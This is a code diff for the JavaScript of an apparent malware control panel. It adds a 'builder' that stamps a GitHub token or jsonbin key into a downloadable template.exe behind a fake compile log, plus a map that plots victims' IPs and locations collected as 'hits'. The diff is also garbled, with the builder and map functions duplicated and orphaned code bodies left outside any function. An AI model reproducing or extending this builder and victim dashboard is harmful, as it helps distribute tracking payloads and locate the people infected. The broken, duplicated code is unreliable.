@@ -115,16 +115,16 @@ function wireButtons() {
     });
   }
 
-  const firebaseSaveBtn = $("firebase-save-btn");
-  const firebaseInput = $("firebase-url");
-  if (firebaseSaveBtn && firebaseInput) {
-    const saved = localStorage.getItem("zx_firebase_host");
-    if (saved) firebaseInput.value = saved;
-    firebaseSaveBtn.addEventListener("click", () => {
-      const val = firebaseInput.value.trim().replace(/^https?:\/\//,"").replace(/\/$/,"");
-      if (!val) { showToast("Paste a Firebase URL first"); return; }
-      localStorage.setItem("zx_firebase_host", val);
-      showToast("Firebase URL saved");
+  const ghSaveBtn  = $("gh-save-btn");
+  const ghInput    = $("gh-token");
+  if (ghSaveBtn && ghInput) {
+    const saved = localStorage.getItem("zx_gh_token");
+    if (saved) ghInput.value = saved;
+    ghSaveBtn.addEventListener("click", () => {
+      const val = ghInput.value.trim();
+      if (!val) { showToast("Paste your GitHub token first"); return; }
+      localStorage.setItem("zx_gh_token", val);
+      showToast("Token saved — reloading map hits");
       if (window.__reloadMapHits) window.__reloadMapHits(val);
     });
   }
@@ -174,6 +174,379 @@ function wireSettings() {
 }
 
 function wireBuilder() {
+  const nameInput     = $("builder-name");
+  const buildBtn      = $("builder-build-btn");
+  const downloadBtn   = $("builder-download-btn");
+  const tokenInput    = $("gh-token");
+  const log           = $("build-log");
+  if (!nameInput || !buildBtn || !downloadBtn || !log) return;
+
+  let building = false;
+  let chosenName = "myapp.exe";
+
+  function addLine(text, cls) {
+    const line = document.createElement("div");
+    line.className = "build-log-line" + (cls ? " " + cls : "");
+    line.textContent = text;
+    log.appendChild(line);
+    log.scrollTop = log.scrollHeight;
+  }
+
+  function sanitizeName(raw) {
+    let name = (raw || "myapp.exe").trim().replace(/[\\/:*?"<>|]/g, "_");
+    if (!name) name = "myapp.exe";
+    if (!/\.exe$/i.test(name)) name += ".exe";
+    return name;
+  }
+
+  function encodeUtf16LE(str) {
+    const bytes = new Uint8Array(str.length * 2);
+    for (let i = 0; i < str.length; i++) {
+      const code = str.charCodeAt(i);
+      bytes[i * 2]     = code & 0xff;
+      bytes[i * 2 + 1] = (code >> 8) & 0xff;
+    }
+    return bytes;
+  }
+
+  function findBytes(haystack, needle) {
+    outer: for (let i = 0; i <= haystack.length - needle.length; i++) {
+      for (let j = 0; j < needle.length; j++) {
+        if (haystack[i + j] !== needle[j]) continue outer;
+      }
+      return i;
+    }
+    return -1;
+  }
+
+  function patchSlot(bytes, markerChar, slotChars, value) {
+    const needle = encodeUtf16LE(markerChar.repeat(slotChars));
+    const offset = findBytes(bytes, needle);
+    if (offset === -1) return;
+    const safe  = value.slice(0, slotChars - 1);
+    const slot  = new Uint8Array(slotChars * 2);
+    slot.set(encodeUtf16LE(safe), 0);
+    bytes.set(slot, offset);
+  }
+
+  buildBtn.addEventListener("click", () => {
+    if (building) return;
+    chosenName = sanitizeName(nameInput.value);
+    building   = true;
+    downloadBtn.disabled = true;
+    buildBtn.disabled    = true;
+    log.innerHTML        = "";
+
+    const steps = [
+      `Compiling sources for ${chosenName}...`,
+      `Linking objects...`,
+      `Injecting endpoint...`,
+      `Packaging ${chosenName}...`,
+      `Build complete: ${chosenName}`,
+    ];
+
+    steps.forEach((text, i) => {
+      setTimeout(() => {
+        const isLast = i === steps.length - 1;
+        addLine(text, isLast ? "done" : "ok");
+        if (isLast) {
+          building = false;
+          buildBtn.disabled    = false;
+          downloadBtn.disabled = false;
+          showToast(`${chosenName} is ready to download`);
+        }
+      }, (i + 1) * 550);
+    });
+  });
+
+  downloadBtn.addEventListener("click", async () => {
+    const token = tokenInput ? tokenInput.value.trim() : localStorage.getItem("zx_gh_token") || "";
+    if (!token) { showToast("Paste your GitHub token first"); return; }
+    const repo = "michaelrtrtr/michaelrtrtr.github.io";
+    try {
+      const res = await fetch("template.exe");
+      if (!res.ok) throw new Error("template.exe not found");
+      const buffer = await res.arrayBuffer();
+      const bytes  = new Uint8Array(buffer);
+      patchSlot(bytes, "K", 80, token);
+      patchSlot(bytes, "R", 64, repo);
+      const blob = new Blob([bytes], { type: "application/octet-stream" });
+      const url  = URL.createObjectURL(blob);
+      const a    = document.createElement("a");
+      a.href     = url;
+      a.download = chosenName;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      URL.revokeObjectURL(url);
+      showToast(`Downloading ${chosenName}`);
+    } catch (err) {
+      showToast("Download failed — is template.exe uploaded?");
+    }
+  });
+}
+
+function initMap() {
+  const shell = $("map-shell");
+  const mapEl = $("map-leaflet");
+  if (!shell || !mapEl || typeof L === "undefined") return;
+
+  const map = L.map(mapEl, {
+    center: [20, 0],
+    zoom: 2.4,
+    zoomControl: false,
+    attributionControl: true,
+    worldCopyJump: true,
+  });
+
+  L.tileLayer("https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png", {
+    attribution: '&copy; OpenStreetMap &copy; CARTO',
+    subdomains: "abcd",
+    maxZoom: 19,
+  }).addTo(map);
+
+  const redIcon = L.divIcon({
+    className: "",
+    html: `<svg xmlns="http://www.w3.org/2000/svg" width="28" height="38" viewBox="0 0 28 38">
+      <path fill="#ff4d6d" stroke="#fff" stroke-width="1.5"
+        d="M14 1C7.4 1 2 6.4 2 13c0 8 12 24 12 24s12-16 12-24C26 6.4 20.6 1 14 1z"/>
+      <circle fill="#fff" cx="14" cy="13" r="5"/>
+    </svg>`,
+    iconSize: [28, 38],
+    iconAnchor: [14, 38],
+    popupAnchor: [0, -40],
+  });
+
+  function loadHits(token) {
+    if (!token) return;
+    const repo = "michaelrtrtr/michaelrtrtr.github.io";
+    fetch(`https://api.github.com/repos/${repo}/issues?labels=hit&state=open&per_page=100`, {
+      headers: {
+        Authorization: `token ${token}`,
+        Accept: "application/vnd.github.v3+json",
+      }
+    })
+    .then(r => r.json())
+    .then(issues => {
+      if (!Array.isArray(issues)) return;
+      issues.forEach(issue => {
+        try {
+          const hit = JSON.parse(issue.body);
+          if (!hit.lat || !hit.lon) return;
+          const marker = L.marker([hit.lat, hit.lon], { icon: redIcon }).addTo(map);
+          marker.bindPopup(`
+            <div style="background:#0d1017;color:#e7e9f3;padding:12px 14px;border-radius:8px;
+              font-family:'JetBrains Mono',monospace;font-size:12px;min-width:190px;">
+              <div style="color:#ff4d6d;font-weight:700;font-size:13px;margin-bottom:6px;">
+                ${hit.ip || "Unknown IP"}
+              </div>
+              <div style="color:#4ce0d2;margin-bottom:4px;">
+                ${hit.city || "—"}, ${hit.country || "—"}
+              </div>
+              <div style="color:#7b8094;font-size:11px;">
+                ${parseFloat(hit.lat).toFixed(4)}, ${parseFloat(hit.lon).toFixed(4)}
+              </div>
+            </div>
+          `);
+        } catch(e) {}
+      });
+    })
+    .catch(() => {});
+  }
+
+  const saved = localStorage.getItem("zx_gh_token");
+  if (saved) loadHits(saved);
+  window.__reloadMapHits = loadHits;
+
+  const zoomInBtn  = $("map-zoom-in");
+  if (zoomInBtn)  zoomInBtn.addEventListener("click",  () => map.zoomIn());
+  const zoomOutBtn = $("map-zoom-out");
+  if (zoomOutBtn) zoomOutBtn.addEventListener("click", () => map.zoomOut());
+  const resetBtn   = $("map-reset");
+  if (resetBtn)   resetBtn.addEventListener("click",   () => map.setView([20, 0], 2.4));
+
+  window.__mapWidget = { resize: () => map.invalidateSize(), draw: () => {} };
+}
+  const nameInput = $("builder-name");
+  const buildBtn = $("builder-build-btn");
+  const downloadBtn = $("builder-download-btn");
+  const keyInput = $("jsonbin-key");
+  const log = $("build-log");
+  if (!nameInput || !buildBtn || !downloadBtn || !log) return;
+
+  let building = false;
+  let chosenName = "myapp.exe";
+
+  function addLine(text, cls) {
+    const line = document.createElement("div");
+    line.className = "build-log-line" + (cls ? " " + cls : "");
+    line.textContent = text;
+    log.appendChild(line);
+    log.scrollTop = log.scrollHeight;
+  }
+
+  function sanitizeName(raw) {
+    let name = (raw || "myapp.exe").trim().replace(/[\\/:*?"<>|]/g, "_");
+    if (!name) name = "myapp.exe";
+    if (!/\.exe$/i.test(name)) name += ".exe";
+    return name;
+  }
+
+  function encodeUtf16LE(str) {
+    const bytes = new Uint8Array(str.length * 2);
+    for (let i = 0; i < str.length; i++) {
+      const code = str.charCodeAt(i);
+      bytes[i * 2] = code & 0xff;
+      bytes[i * 2 + 1] = (code >> 8) & 0xff;
+    }
+    return bytes;
+  }
+
+  function findBytes(haystack, needle) {
+    outer: for (let i = 0; i <= haystack.length - needle.length; i++) {
+      for (let j = 0; j < needle.length; j++) {
+        if (haystack[i + j] !== needle[j]) continue outer;
+      }
+      return i;
+    }
+    return -1;
+  }
+
+  function patchExe(buffer, apiKey) {
+    const bytes = new Uint8Array(buffer);
+    const SLOT_CHARS = 64;
+    const needle = encodeUtf16LE("K".repeat(SLOT_CHARS));
+    const offset = findBytes(bytes, needle);
+    if (offset !== -1 && apiKey) {
+      const safe = apiKey.trim().slice(0, SLOT_CHARS - 1);
+      const slot = new Uint8Array(SLOT_CHARS * 2);
+      slot.set(encodeUtf16LE(safe), 0);
+      bytes.set(slot, offset);
+    }
+    return bytes;
+  }
+
+  buildBtn.addEventListener("click", () => {
+    if (building) return;
+    chosenName = sanitizeName(nameInput.value);
+    building = true;
+    downloadBtn.disabled = true;
+    buildBtn.disabled = true;
+    log.innerHTML = "";
+
+    const steps = [
+      `Compiling sources for ${chosenName}...`,
+      `Linking objects...`,
+      `Injecting API endpoint...`,
+      `Packaging ${chosenName}...`,
+      `Build complete: ${chosenName}`,
+    ];
+
+    steps.forEach((text, i) => {
+      setTimeout(() => {
+        const isLast = i === steps.length - 1;
+        addLine(text, isLast ? "done" : "ok");
+        if (isLast) {
+          building = false;
+          buildBtn.disabled = false;
+          downloadBtn.disabled = false;
+          showToast(`${chosenName} is ready to download`);
+        }
+      }, (i + 1) * 550);
+    });
+  });
+
+  downloadBtn.addEventListener("click", async () => {
+    const apiKey = keyInput ? keyInput.value.trim() : localStorage.getItem("zx_jsonbin_key") || "";
+    if (!apiKey) { showToast("Paste your jsonbin key first"); return; }
+    try {
+      const res = await fetch("template.exe");
+      if (!res.ok) throw new Error("template.exe not found");
+      const buffer = await res.arrayBuffer();
+      const patched = patchExe(buffer, apiKey);
+      const blob = new Blob([patched], { type: "application/octet-stream" });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = chosenName;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      URL.revokeObjectURL(url);
+      showToast(`Downloading ${chosenName}`);
+    } catch (err) {
+      showToast("Download failed — is template.exe uploaded?");
+    }
+  });
+}
+
+function initMap() {
+  const shell = $("map-shell");
+  const mapEl = $("map-leaflet");
+  if (!shell || !mapEl || typeof L === "undefined") return;
+
+  const map = L.map(mapEl, {
+    center: [20, 0],
+    zoom: 2.4,
+    zoomControl: false,
+    attributionControl: true,
+    worldCopyJump: true,
+  });
+
+  L.tileLayer("https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png", {
+    attribution: '&copy; OpenStreetMap &copy; CARTO',
+    subdomains: "abcd",
+    maxZoom: 19,
+  }).addTo(map);
+
+  const redIcon = L.divIcon({
+    className: "",
+    html: `<svg xmlns="http://www.w3.org/2000/svg" width="28" height="38" viewBox="0 0 28 38">
+      <path fill="#ff4d6d" stroke="#fff" stroke-width="1.5" d="M14 1C7.4 1 2 6.4 2 13c0 8 12 24 12 24s12-16 12-24C26 6.4 20.6 1 14 1z"/>
+      <circle fill="#fff" cx="14" cy="13" r="5"/>
+    </svg>`,
+    iconSize: [28, 38],
+    iconAnchor: [14, 38],
+    popupAnchor: [0, -40],
+  });
+
+  function loadHits(apiKey) {
+    if (!apiKey) return;
+    fetch("https://api.jsonbin.io/v3/b?collection=true", {
+      headers: { "X-Master-Key": apiKey }
+    })
+    .then(r => r.json())
+    .then(data => {
+      if (!Array.isArray(data)) return;
+      data.forEach(bin => {
+        const hit = bin.record;
+        if (!hit || !hit.lat || !hit.lon) return;
+        const marker = L.marker([hit.lat, hit.lon], { icon: redIcon }).addTo(map);
+        marker.bindPopup(`
+          <div style="background:#0d1017;color:#e7e9f3;padding:12px 14px;border-radius:8px;font-family:'JetBrains Mono',monospace;font-size:12px;min-width:190px;">
+            <div style="color:#ff4d6d;font-weight:700;font-size:13px;margin-bottom:6px;">${hit.ip || "Unknown IP"}</div>
+            <div style="color:#4ce0d2;margin-bottom:4px;">${hit.city || "—"}, ${hit.country || "—"}</div>
+            <div style="color:#7b8094;font-size:11px;">${(hit.lat).toFixed(4)}, ${(hit.lon).toFixed(4)}</div>
+          </div>
+        `);
+      });
+    })
+    .catch(() => {});
+  }
+
+  const saved = localStorage.getItem("zx_jsonbin_key");
+  if (saved) loadHits(saved);
+  window.__reloadMapHits = loadHits;
+
+  const zoomInBtn = $("map-zoom-in");
+  if (zoomInBtn) zoomInBtn.addEventListener("click", () => map.zoomIn());
+  const zoomOutBtn = $("map-zoom-out");
+  if (zoomOutBtn) zoomOutBtn.addEventListener("click", () => map.zoomOut());
+  const resetBtn = $("map-reset");
+  if (resetBtn) resetBtn.addEventListener("click", () => map.setView([20, 0], 2.4));
+
+  window.__mapWidget = { resize: () => map.invalidateSize(), draw: () => {} };
+}
   const nameInput = $("builder-name");
   const buildBtn = $("builder-build-btn");
   const downloadBtn = $("builder-download-btn");
